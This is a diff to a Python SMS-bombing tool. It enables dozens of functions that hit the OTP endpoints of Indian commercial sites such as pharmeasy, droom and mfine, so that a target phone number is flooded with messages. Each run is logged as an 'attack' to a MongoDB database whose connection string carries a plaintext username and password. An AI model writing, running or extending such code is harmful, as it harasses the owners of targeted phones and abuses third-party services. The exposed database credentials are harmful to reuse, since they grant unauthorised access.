@@ -2,10 +2,13 @@ import time
 import asyncio
 import aiohttp
 import requests
+from datetime import datetime
+from pymongo.mongo_client import MongoClient
+
+conp = MongoClient("mongodb+srv://thejatin:jatinkalwar@attacknum.nmuaiq8.mongodb.net/?retryWrites=true&w=majority")
 
 
-
-async def indsms(tarnum: int):
+async def indsms(tarnum: int , skey):
     async def whitehat(tarnum: int):
         try:
 
@@ -1053,59 +1056,163 @@ async def indsms(tarnum: int):
         except Exception as e:
             return "failed"
 
-    async def main(tarnum):
-        print("here")
+    async def droom(tarnum: int):
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Referer': 'https://droom.in/individual/account-signup',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': 'https://droom.in',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'Connection': 'keep-alive',
+                'Alt-Used': 'droom.in',
+            }
 
-        for i in range(1):
+            data = {
+                'mobile_phone': '9990212082',
+                'email': 'linux@gmail.com',
+                'captcha_value': '',
+                'channel': '',
+                '_token': 'DMYilFdihdPSQh5YoxjNthim5ku9w1HliG6uLLPR',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://droom.in/send-onboard-otp', headers=headers, data=data) as response:
+                    print()
+            return "done"
+        except Exception as e:
+            return "failed"
+
+    async def pharmaeasy(tarnum: int):
+        try:
+            json_data = {
+                'param': '9990212082',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://pharmeasy.in/apt-api/login/send-otp', json=json_data) as response:
+                    print()
+            return "done"
+        except Exception as e:
+            return "failed"
+
+    async def biomall(tarnum: int):
+        try:
+
+            data = {
+                'phn': '8287844474',
+                'code': '91',
+                'email': 'kuy@gmail.com',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.biomall.in/triggerOtp', data=data) as response:
+                    print()
+            return "done"
+        except Exception as e:
+            return "failed"
+
+    async def mfine(tarnum: int):
+        try:
+            json_data = [
+                {
+                    'ts': '2023-07-14T16:49:59.238Z',
+                    'user_id': '',
+                    'device_id': 'd212a42e-736f-4fd8-afc5-4bf0ae1e3ecc',
+                    'et': 'ButtonClicked',
+                    'ed': 'APP',
+                    'app': 'PW',
+                    'pagename': '',
+                    'buttonName': 'Send OTP',
+                    'context': {
+                        'appPath': '/consult/',
+                        'loginHalfCard': False,
+                        'phone': f'{tarnum}',
+                        'otpType': 'signin-otp',
+                    },
+                    'channel': '',
+                    'shareChannel': '',
+                    'utm_source': '',
+                    'utm_medium': '',
+                    'utm_campaign': '',
+                    'isMobile': False,
+                    'caseId': '',
+                    'profileId': '',
+                    'url': 'https://www.mfine.co/consult/login?referrer=https://www.mfine.co/',
+                    'host': 'www.mfine.co',
+                    'referrer': 'https://www.mfine.co/',
+                    'platform': 'web',
+                },
+            ]
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.mfine.co/consult/proxy/firehose', json=json_data) as response:
+                    print()
+            return "done"
+        except Exception as e:
+            return "failed"
+
+    async def entry(tarnum , skey):
+        try:
+            conp.attack.attacknum.insert_one(
+                {"key": skey, "on": tarnum, "type": "sms", "count": "india", "when": str(datetime.now())})
+            return "ok"
+        except Exception as e:
+            return e
+
+    async def main(tarnum , skey):
+        for i in range(3):
             jh = await asyncio.gather(
                 whitehat(tarnum),
                 moglix(tarnum),
                 medibuddy(tarnum),
                 gopaysense(tarnum),
-                # rapido(tarnum),
-                # dunzo(tarnum),
-                # byjus(tarnum),
-                # ballebazi(tarnum),
-                # zee5(tarnum),
-                # doubtnut(tarnum),
-                # vedantu(tarnum),
-                # upgrade(tarnum),
-                # physics(tarnum),
-                # confirm(tarnum),
-                # redbus(tarnum),
-                # trainman(tarnum),
-                # decathon(tarnum),
-                # lybra(tarnum),
-                # dentalcart(tarnum),
-                # skecher(tarnum),
-                # croma(tarnum),
-                # tendercut(tarnum),
-                # textbook(tarnum),
-                # mg1(tarnum),
-                # apollo247(tarnum),
-                # unacademy(tarnum),
-                # Xtracover(tarnum),
-                # mgy(tarnum),
-                # # flyphone(tarnum),
-                # tyre(tarnum),
-                # winni(tarnum),
-                # mrbrown(tarnum),
-                # # moho(tarnum),
-                # spinny(tarnum),
-                # # carandbike(tarnum),
-                # goibobo(tarnum),
-                # tradeindia(tarnum),
-                # mobex(tarnum),
-                # bharatmetro(tarnum),
-                # medkart(tarnum),
-                # frankross(tarnum),
-                # mamaearth(tarnum),
-                # caratlane(tarnum),
-                hometriangle(tarnum)
+                rapido(tarnum),
+                dunzo(tarnum),
+                byjus(tarnum),
+                ballebazi(tarnum),
+                zee5(tarnum),
+                doubtnut(tarnum),
+                vedantu(tarnum),
+                upgrade(tarnum),
+                physics(tarnum),
+                confirm(tarnum),
+                redbus(tarnum),
+                trainman(tarnum),
+                decathon(tarnum),
+                lybra(tarnum),
+                dentalcart(tarnum),
+                skecher(tarnum),
+                croma(tarnum),
+                tendercut(tarnum),
+                textbook(tarnum),
+                mg1(tarnum),
+                apollo247(tarnum),
+                unacademy(tarnum),
+                Xtracover(tarnum),
+                mgy(tarnum),
+                # flyphone(tarnum),
+                tyre(tarnum),
+                winni(tarnum),
+                mrbrown(tarnum),
+                # moho(tarnum),
+                spinny(tarnum),
+                # carandbike(tarnum),
+                goibobo(tarnum),
+                tradeindia(tarnum),
+                mobex(tarnum),
+                bharatmetro(tarnum),
+                medkart(tarnum),
+                frankross(tarnum),
+                mamaearth(tarnum),
+                caratlane(tarnum),
+                hometriangle(tarnum),
+                pharmaeasy(tarnum),
+                mfine(tarnum),
+                biomall(tarnum)
 
             )
-            print(jh)
-
-    await main(tarnum)
-
+        await entry(tarnum , skey)
+    return await main(tarnum , skey)
 
